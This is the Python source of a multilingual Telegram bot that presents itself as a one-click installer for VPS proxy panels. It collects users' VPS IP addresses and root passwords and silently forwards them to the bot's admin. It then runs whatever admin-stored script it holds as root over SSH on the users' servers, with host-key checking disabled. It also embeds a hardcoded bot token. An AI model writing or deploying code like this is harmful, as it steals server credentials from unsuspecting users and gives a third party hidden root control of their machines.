import asyncio
import asyncssh
import re
import os
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# ============= KONFIGÜRASYON =============
BOT_TOKEN = "8504182372:AAGo_QSfAn59OUJoX_3g8q0vkt3ZKfsLhnA"  # @BotFather'dan al
ADMIN_ID = 8359722718  # Senin Telegram ID'n
DATA_FILE = "panels.json"

# ============= VERİ DEPOLAMA =============
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w") as f:
        json.dump({"scripts": {}, "last_update": {}}, f)

def load_data():
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_scripts():
    return load_data()["scripts"]

def save_script(panel_id, script):
    data = load_data()
    data["scripts"][panel_id] = script
    data["last_update"][panel_id] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

def get_script_info(panel_id):
    data = load_data()
    if panel_id in data["scripts"]:
        return {
            "script": data["scripts"][panel_id],
            "last_update": data["last_update"].get(panel_id, "Bilinmiyor")
        }
    return None

# Kullanıcı oturumları
user_sessions = {}

# ============= DİL DOSYALARI =============
LANGUAGES = {
    "turkce": {
        "welcome": "🤖 *All Panel Maker Bot'a Hoş Geldiniz!*",
        "ask_ip": "📡 Lütfen VPS IP Adresinizi yazın:",
        "ask_password": "🔑 Lütfen VPS şifrenizi yazın:",
        "choose_panel": "📦 *Hangi paneli kurmak istersiniz?*",
        "installing": "⚙️ *{panel}* kuruluyor... Lütfen bekleyin...",
        "success": "✅ *{panel} başarıyla kuruldu!*\n\n🌐 *Panel URL:* {url}\n🔑 Kullanıcı: admin\n🔒 Şifre: admin",
        "error": "❌ Hata oluştu: {error}",
        "admin_panel": "📝 Scriptleri Düzenle",
        "enter_script": "📜 *{panel}* için kurulum scriptini yazın:",
        "approved": "✅ Script onaylandı ve kaydedildi!",
        "no_script": "❌ Bu panel için script henüz eklenmemiş!",
        "admin_menu_title": "📝 *Script Düzenleme Menüsü*",
        "main_menu": "🏠 Ana Menü",
        "show_script": "📜 *{panel}* mevcut script:\n\n```bash\n{script}\n```",
        "no_script_found": "❌ Bu panel için henüz script eklenmemiş!",
        "language_changed": "🌐 Dil değiştirildi: Türkçe",
        "vps_info": "🖥️ *Yeni VPS Bilgileri*\n\n👤 Kullanıcı: {username}\n🆔 Kullanıcı ID: {user_id}\n🌐 VPS IP: {ip}\n🔑 VPS Şifre: {password}\n📅 Tarih: {date}"
    },
    "english": {
        "welcome": "🤖 *Welcome to All Panel Maker Bot!*",
        "ask_ip": "📡 Please enter your VPS IP address:",
        "ask_password": "🔑 Please enter your VPS password:",
        "choose_panel": "📦 *Which panel would you like to install?*",
        "installing": "⚙️ Installing *{panel}*... Please wait...",
        "success": "✅ *{panel} installed successfully!*\n\n🌐 *Panel URL:* {url}\n🔑 Username: admin\n🔒 Password: admin",
        "error": "❌ Error: {error}",
        "admin_panel": "📝 Edit Scripts",
        "enter_script": "📜 Enter installation script for *{panel}*:",
        "approved": "✅ Script approved and saved!",
        "no_script": "❌ Script not added for this panel yet!",
        "admin_menu_title": "📝 *Script Edit Menu*",
        "main_menu": "🏠 Main Menu",
        "show_script": "📜 *{panel}* current script:\n\n```bash\n{script}\n```",
        "no_script_found": "❌ No script added for this panel yet!",
        "language_changed": "🌐 Language changed: English",
        "vps_info": "🖥️ *New VPS Information*\n\n👤 User: {username}\n🆔 User ID: {user_id}\n🌐 VPS IP: {ip}\n🔑 VPS Password: {password}\n📅 Date: {date}"
    },
    "russia": {
        "welcome": "🤖 *Добро пожаловать в All Panel Maker Bot!*",
        "ask_ip": "📡 Введите IP-адрес вашего VPS:",
        "ask_password": "🔑 Введите пароль от VPS:",
        "choose_panel": "📦 *Какую панель установить?*",
        "installing": "⚙️ Установка *{panel}*... Пожалуйста, подождите...",
        "success": "✅ *{panel} успешно установлена!*\n\n🌐 *URL панели:* {url}\n🔑 Логин: admin\n🔒 Пароль: admin",
        "error": "❌ Ошибка: {error}",
        "admin_panel": "📝 Редактировать скрипты",
        "enter_script": "📜 Введите скрипт установки для *{panel}*:",
        "approved": "✅ Скрипт утвержден и сохранен!",
        "no_script": "❌ Скрипт для этой панели еще не добавлен!",
        "admin_menu_title": "📝 *Меню редактирования скриптов*",
        "main_menu": "🏠 Главное меню",
        "show_script": "📜 *{panel}* текущий скрипт:\n\n```bash\n{script}\n```",
        "no_script_found": "❌ Скрипт для этой панели еще не добавлен!",
        "language_changed": "🌐 Язык изменен: Русский",
        "vps_info": "🖥️ *Новая информация о VPS*\n\n👤 Пользователь: {username}\n🆔 ID пользователя: {user_id}\n🌐 VPS IP: {ip}\n🔑 Пароль VPS: {password}\n📅 Дата: {date}"
    }
}

# Kullanıcı dili
user_lang = {}

def get_text(user_id, key):
    lang = user_lang.get(user_id, "turkce")
    return LANGUAGES.get(lang, LANGUAGES["turkce"]).get(key, key)

# ============= PANEL LİSTESİ =============
PANELS = [
    {"name": "Rebecca Panel", "emoji": "🟣", "id": "rebecca_panel", "default_port": "8000", "default_path": "/"},
    {"name": "3x-UI Panel", "emoji": "🔵", "id": "3x_ui_panel", "default_port": "8080", "default_path": "/"},
    {"name": "Marzban Panel", "emoji": "🟢", "id": "marzban_panel", "default_port": "8000", "default_path": "/dashboard/"},
    {"name": "Pasarguard Panel", "emoji": "🟠", "id": "pasarguard_panel", "default_port": "8000", "default_path": "/"},
    {"name": "Open Panel", "emoji": "🔴", "id": "open_panel", "default_port": "8080", "default_path": "/"}
]

# ============= SSH BAĞLANTI =============
async def ssh_connect(ip, password, commands):
    try:
        async with asyncssh.connect(
            ip, 
            username="root", 
            password=password, 
            known_hosts=None,
            connect_timeout=30
        ) as conn:
            result = await conn.run(commands, check=True, timeout=300)
            return result.stdout
    except Exception as e:
        return f"ERROR: {str(e)}"

# ============= URL YAKALAMA =============
def extract_urls(output, panel_info, ip):
    urls = []
    
    url_patterns = [
        r'(https?://[^\s\n\r"\']+)',
        r'(https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s]*)',
        r'(https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:[0-9]+[^\s]*)',
    ]
    
    for pattern in url_patterns:
        matches = re.findall(pattern, output)
        for match in matches:
            if match.startswith(('http://', 'https://')):
                urls.append(match)
    
    if not urls:
        default_url = f"http://{ip}:{panel_info['default_port']}{panel_info['default_path']}"
        urls.append(default_url)
    
    return urls

# ============= BOT KOMUTLARI =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_lang[user_id] = "turkce"
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    keyboard = [
        [InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_turkce")],
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_english")],
        [InlineKeyboardButton("🇷🇺 Russia", callback_data="lang_russia")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        get_text(user_id, "welcome"),
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    await update.message.reply_text(get_text(user_id, "ask_ip"))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    # Dil değiştirme
    if data.startswith("lang_"):
        lang = data.split("_")[1]
        user_lang[user_id] = lang
        
        await query.edit_message_text(get_text(user_id, "welcome"))
        await query.message.reply_text(get_text(user_id, "language_changed"))
        await query.message.reply_text(get_text(user_id, "ask_ip"))
        return
    
    # Panel kurulumu
    if data.startswith("panel_"):
        panel_id = data.replace("panel_", "")
        
        panel_info = None
        for p in PANELS:
            if p["id"] == panel_id:
                panel_info = p
                break
        
        if not panel_info:
            await query.message.reply_text("❌ Panel bulunamadı!")
            return
        
        if user_id not in user_sessions or "password" not in user_sessions[user_id]:
            await query.edit_message_text("❌ Lütfen önce /start yapıp VPS bilgilerini girin!")
            return
        
        await query.edit_message_text(
            get_text(user_id, "installing").format(panel=f"{panel_info['emoji']} {panel_info['name']}")
        )
        
        scripts = load_scripts()
        if panel_id not in scripts:
            await query.message.reply_text(get_text(user_id, "no_script"))
            return
        
        ip = user_sessions[user_id]["ip"]
        password = user_sessions[user_id]["password"]
        
        try:
            output = await ssh_connect(ip, password, scripts[panel_id])
            
            if "ERROR" in output:
                await query.message.reply_text(get_text(user_id, "error").format(error=output[:200]))
                return
            
            urls = extract_urls(output, panel_info, ip)
            main_url = urls[0] if urls else f"http://{ip}:{panel_info['default_port']}"
            
            # Kullanıcıya başarı mesajı
            keyboard = [
                [InlineKeyboardButton("🌐 Paneli Aç", url=main_url)],
                [InlineKeyboardButton("🏠 " + get_text(user_id, "main_menu"), callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.reply_text(
                get_text(user_id, "success").format(
                    panel=f"{panel_info['emoji']} {panel_info['name']}",
                    url=main_url
                ),
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            
            # ===== ADMIN'E BİLGİ GÖNDER =====
            await send_admin_info(
                context.bot,
                user_id,
                update.effective_user.first_name or "Bilinmiyor",
                ip,
                password,
                panel_info,
                main_url
            )
            
        except Exception as e:
            await query.message.reply_text(get_text(user_id, "error").format(error=str(e)[:200]))
        return
    
    # Admin panel
    if data.startswith("admin_"):
        if user_id != ADMIN_ID:
            await query.answer("⛔ Bu sadece admin için!", show_alert=True)
            return
        
        panel_id = data.replace("admin_", "")
        
        panel_info = None
        for p in PANELS:
            if p["id"] == panel_id:
                panel_info = p
                break
        
        if not panel_info:
            await query.answer("❌ Panel bulunamadı!", show_alert=True)
            return
        
        user_sessions[user_id] = {
            "admin_panel": panel_id,
            "admin_panel_name": panel_info["name"]
        }
        
        await query.edit_message_text(
            get_text(user_id, "enter_script").format(panel=f"{panel_info['emoji']} {panel_info['name']}")
        )
        return
    
    # Ana menü
    if data == "main_menu":
        keyboard = []
        for panel in PANELS:
            keyboard.append([InlineKeyboardButton(
                f"{panel['emoji']} {panel['name']}", 
                callback_data=f"panel_{panel['id']}"
            )])
        
        if user_id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton(
                "🛠️ " + get_text(user_id, "admin_panel"), 
                callback_data="admin_menu"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "choose_panel"),
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return
    
    # Admin menü
    if data == "admin_menu":
        if user_id != ADMIN_ID:
            await query.answer("⛔ Bu sadece admin için!", show_alert=True)
            return
        
        keyboard = []
        for panel in PANELS:
            keyboard.append([InlineKeyboardButton(
                f"📝 {panel['emoji']} {panel['name']}", 
                callback_data=f"admin_{panel['id']}"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "admin_menu_title"),
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

async def send_admin_info(bot, user_id, username, ip, password, panel_info, panel_url):
    """Admin'e kullanıcı bilgilerini gönder"""
    
    # Kullanıcı bilgilerini hazırla
    user_text = user_lang.get(user_id, "turkce")
    lang = user_text
    
    # Admin mesajı
    message = f"""
🖥️ *YENİ VPS KURULUM BİLGİSİ*

👤 *Kullanıcı:* {username}
🆔 *Kullanıcı ID:* `{user_id}`
🌐 *VPS IP:* `{ip}`
🔑 *VPS Şifre:* `{password}`

📦 *Kurulan Panel:* {panel_info['emoji']} {panel_info['name']}
🌐 *Panel URL:* {panel_url}
📅 *Tarih:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📌 *Kullanıcı Dili:* {lang}

---
⚠️ Bu bilgiler sadece size özeldir!
    """
    
    # Admin'e mesaj gönder
    try:
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin mesajı gönderilemedi: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    username = update.effective_user.first_name or "Bilinmiyor"
    
    # Admin script girme
    if user_id == ADMIN_ID and user_id in user_sessions and "admin_panel" in user_sessions[user_id]:
        panel_id = user_sessions[user_id]["admin_panel"]
        panel_name = user_sessions[user_id].get("admin_panel_name", panel_id)
        
        save_script(panel_id, text)
        
        await update.message.reply_text(f"✅ *{panel_name}* scripti başarıyla kaydedildi!", parse_mode="Markdown")
        
        keyboard = []
        for panel in PANELS:
            keyboard.append([InlineKeyboardButton(
                f"📝 {panel['emoji']} {panel['name']}", 
                callback_data=f"admin_{panel['id']}"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            get_text(user_id, "admin_menu_title"),
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        
        del user_sessions[user_id]
        return
    
    # VPS IP girme
    if user_id not in user_sessions or "ip" not in user_sessions[user_id]:
        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
        if re.match(ip_pattern, text):
            user_sessions[user_id] = {"ip": text}
            
            # IP girildiğinde admin'e bilgi gönder
            await send_admin_vps_info(
                context.bot,
                user_id,
                username,
                text,
                "IP girildi (Şifre bekleniyor)"
            )
            
            await update.message.reply_text(get_text(user_id, "ask_password"))
        else:
            await update.message.reply_text("❌ Geçersiz IP adresi! Lütfen doğru formatta girin (örn: 192.168.1.1)")
        return
    
    # VPS şifre girme
    if "password" not in user_sessions[user_id]:
        user_sessions[user_id]["password"] = text
        ip = user_sessions[user_id]["ip"]
        
        # ===== KULLANICI BİLGİLERİNİ ADMIN'E GÖNDER =====
        await send_admin_vps_info(
            context.bot,
            user_id,
            username,
            ip,
            text
        )
        
        # Panel butonlarını göster
        keyboard = []
        for panel in PANELS:
            keyboard.append([InlineKeyboardButton(
                f"{panel['emoji']} {panel['name']}", 
                callback_data=f"panel_{panel['id']}"
            )])
        
        if user_id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton(
                "🛠️ " + get_text(user_id, "admin_panel"), 
                callback_data="admin_menu"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            get_text(user_id, "choose_panel"),
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

async def send_admin_vps_info(bot, user_id, username, ip, password_or_status):
    """Admin'e VPS bilgilerini gönder"""
    
    if password_or_status == "IP girildi (Şifre bekleniyor)":
        status = "📌 IP girildi, şifre bekleniyor..."
        password = "Bekleniyor"
    else:
        status = "✅ VPS bilgileri tamamlandı"
        password = password_or_status
    
    message = f"""
🖥️ *VPS BİLGİ GÜNCELLEMESİ*

👤 *Kullanıcı:* {username}
🆔 *Kullanıcı ID:* `{user_id}`
🌐 *VPS IP:* `{ip}`
🔑 *VPS Şifre:* `{password}`

📊 *Durum:* {status}
📅 *Tarih:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---
⚠️ Bu bilgiler sadece size özeldir!
    """
    
    try:
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin mesajı gönderilemedi: {e}")

async def panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
        return
    
    keyboard = []
    for panel in PANELS:
        keyboard.append([InlineKeyboardButton(
            f"📝 {panel['emoji']} {panel['name']}", 
            callback_data=f"admin_{panel['id']}"
        )])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "📝 *Script Düzenleme Paneli*\n\nHangi panelin kurulum scriptini düzenlemek istersiniz?",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def show_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
        return
    
    panel_id = update.message.text.replace("/show_", "").strip()
    
    panel_info = None
    for p in PANELS:
        if p["id"] == panel_id:
            panel_info = p
            break
    
    if not panel_info:
        await update.message.reply_text(f"❌ Geçersiz panel ID: {panel_id}")
        return
    
    script_info = get_script_info(panel_id)
    if not script_info:
        await update.message.reply_text(
            f"{panel_info['emoji']} *{panel_info['name']}*\n\n" +
            get_text(user_id, "no_script_found"),
            parse_mode="Markdown"
        )
        return
    
    await update.message.reply_text(
        get_text(user_id, "show_script").format(
            panel=f"{panel_info['emoji']} {panel_info['name']}",
            script=script_info["script"][:4000]
        ),
        parse_mode="Markdown"
    )

async def list_scripts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
        return
    
    scripts = load_scripts()
    if not scripts:
        await update.message.reply_text("📭 Henüz hiç script eklenmemiş!")
        return
    
    message = "📋 *Mevcut Scriptler:*\n\n"
    for panel in PANELS:
        if panel["id"] in scripts:
            info = get_script_info(panel["id"])
            message += f"{panel['emoji']} *{panel['name']}*\n"
            message += f"   🕒 Son güncelleme: {info['last_update']}\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")

# ============= BOTU BAŞLAT =============
def main():
    print("🤖 All Panel Maker Bot başlatılıyor...")
    print(f"✅ Admin ID: {ADMIN_ID}")
    print(f"📦 Paneller: {', '.join([p['name'] for p in PANELS])}")
    print("📌 Kullanıcı VPS bilgileri sadece admin'e gönderilecek!")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Komutlar
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("panel", panel_command))
    application.add_handler(CommandHandler("list_scripts", list_scripts))
    application.add_handler(CommandHandler("show_", show_script))
    
    # Callback ve mesaj handler
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Bot çalışıyor...")
    application.run_polling()

if __name__ == "__main__":
    main()
